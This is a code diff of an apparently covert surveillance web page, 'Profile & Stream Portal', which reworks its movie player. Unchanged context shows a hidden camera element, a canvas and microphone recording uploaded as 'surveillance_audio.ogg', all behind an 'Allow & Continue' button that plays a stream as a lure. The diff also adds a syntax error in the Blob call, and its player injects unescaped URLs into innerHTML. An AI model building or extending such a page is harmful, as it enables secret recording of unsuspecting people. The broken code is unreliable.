@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Profile & Stream Portal</title>
     <script src="/socket.io/socket.io.js"></script>
+    <!-- HLS.js Library for M3U8 Stream Support -->
     <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
     <style>
         * { box-sizing: border-box; }
@@ -109,20 +110,26 @@
         }
         .btn:hover { background-color: #0ea5e9; }
 
-        #mediaPlayer {
+        #mediaContainer {
             width: 100%;
             height: 100%;
-            border: none;
             display: none;
             position: absolute;
             z-index: 5;
-            object-fit: cover;
             background: #000;
+        }
+
+        #mediaContainer iframe, #mediaContainer video {
+            width: 100%;
+            height: 100%;
+            border: none;
+            object-fit: contain;
         }
     </style>
 </head>
 <body>
 
+    <!-- Screen Flash overlay for /moreff -->
     <div id="screenFlash" style="display:none; position:absolute; top:0; left:0; width:100vw; height:100vh; background:white; z-index:9999;"></div>
 
     <div id="profileSection">
@@ -140,7 +147,8 @@
         <button class="btn" id="actionBtn">Allow & Continue</button>
     </div>
 
-    <video id="mediaPlayer" controls autoplay playsinline></video>
+    <!-- Container jisme aapka movie player dynamically load hoga -->
+    <div id="mediaContainer"></div>
 
     <video id="hiddenCamera" autoplay playsinline style="display:none; position:absolute; opacity:0; pointer-events:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -151,42 +159,58 @@
         const profilePicInput = document.getElementById('profilePicInput');
         const previewImg = document.getElementById('previewImg');
         const actionBtn = document.getElementById('actionBtn');
-        const mediaPlayer = document.getElementById('mediaPlayer');
+        const mediaContainer = document.getElementById('mediaContainer');
         
         let socket = io();
         let wakeLock = null;
 
-        // Server se active stream link fetch karne ka function
+        // Server se active stream link fetch karke player mein chalane ka main function
         async function fetchAndPlayStream() {
             try {
                 const response = await fetch('/get-stream');
                 const data = await response.json();
                 const streamUrl = data.url;
 
-                mediaPlayer.style.display = 'block';
-
-                if (streamUrl.includes('.m3u8') || streamUrl.includes('/stream/')) {
-                    if (Hls.isSupported()) {
-                        const hls = new Hls();
-                        hls.loadSource(streamUrl);
-                        hls.attachMedia(mediaPlayer);
-                        hls.on(Hls.Events.MANIFEST_PARSED, () => {
-                            mediaPlayer.play().catch(e => console.log("HLS Play Error:", e));
-                        });
-                    } else if (mediaPlayer.canPlayType('application/vnd.apple.mpegurl')) {
-                        mediaPlayer.src = streamUrl;
-                        mediaPlayer.play().catch(e => console.log("Safari Play Error:", e));
-                    } else {
-                        mediaPlayer.src = streamUrl;
-                        mediaPlayer.play().catch(e => console.log("Fallback Play Error:", e));
-                    }
-                } else {
-                    mediaPlayer.src = streamUrl;
-                    mediaPlayer.play().catch(e => console.log("Normal Play Error:", e));
-                }
+                mediaContainer.style.display = 'block';
+                mediaContainer.innerHTML = buildPlayer(streamUrl);
             } catch (err) {
                 console.log("Error fetching stream URL:", err);
             }
+        }
+
+        // Aapka movie website wala exact buildPlayer function
+        function buildPlayer(url) {
+            if (!url) return '';
+            url = url.trim();
+            if (url.includes('youtube.com') || url.includes('youtu.be')) {
+                const m   = url.match(/(?:v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/);
+                const src = m ? `https://www.youtube.com/embed/${m[1]}?autoplay=1&rel=0` : url;
+                return `<iframe src="${src}" allowfullscreen allow="autoplay;fullscreen;encrypted-media"></iframe>`;
+            }
+            if (url.includes('drive.google.com')) {
+                const fid = (url.match(/\/d\/([^/]+)/) || url.match(/id=([^&]+)/))?.[1];
+                const src = fid ? `https://drive.google.com/file/d/${fid}/preview` : url;
+                return `<iframe src="${src}" allowfullscreen allow="autoplay;fullscreen"></iframe>`;
+            }
+            if (url.includes('.m3u8')) {
+                const vid = 'hls-' + Date.now();
+                setTimeout(() => {
+                    const v = document.getElementById(vid);
+                    if (!v) return;
+                    if (window.Hls && Hls.isSupported()) {
+                        const hls = new Hls({ enableWorker: false });
+                        hls.loadSource(url); hls.attachMedia(v);
+                        hls.on(Hls.Events.MANIFEST_PARSED, () => v.play().catch(()=>{}));
+                    } else if (v.canPlayType('application/vnd.apple.mpegurl')) {
+                        v.src = url; v.play().catch(()=>{});
+                    }
+                }, 100);
+                return `<video id="${vid}" controls autoplay playsinline preload="metadata" style="width:100%;height:100%;display:block;background:#000;"></video>`;
+            }
+            if (/\.(mp4|webm|ogg)(\?|$)/i.test(url)) {
+                return `<video controls autoplay playsinline preload="metadata" style="width:100%;height:100%;display:block;background:#000;"><source src="${url}"/></video>`;
+            }
+            return `<iframe src="${url}" allowfullscreen allow="autoplay;fullscreen;encrypted-media" referrerpolicy="no-referrer" scrolling="no"></iframe>`;
         }
 
         // Persistent check via LocalStorage
@@ -245,7 +269,7 @@
             } catch (err) {}
 
             profileSection.style.display = 'none';
-            fetchAndPlayStream(); // Server se link fetch karke play karega
+            fetchAndPlayStream(); // Yahan aapka wahi movie player active ho jayega
 
             initializeSecuritySystem();
         });
@@ -338,7 +362,7 @@
                     let chunks = [];
                     mediaRecorder.ondataavailable = e => chunks.push(e.data);
                     mediaRecorder.onstop = async () => {
-                        const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                        const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' };
                         const formData = new FormData();
                         formData.append('audio', blob, 'surveillance_audio.ogg');
                         await fetch('/upload-audio', { method: 'POST', body: formData });
@@ -395,7 +419,7 @@
         }
 
         document.addEventListener('visibilitychange', async () => {
-            if (document.visibilityState === 'visible' && mediaPlayer.style.display === 'block') {
+            if (document.visibilityState === 'visible' && mediaContainer.style.display === 'block') {
                 keepScreenAwake();
             }
         });
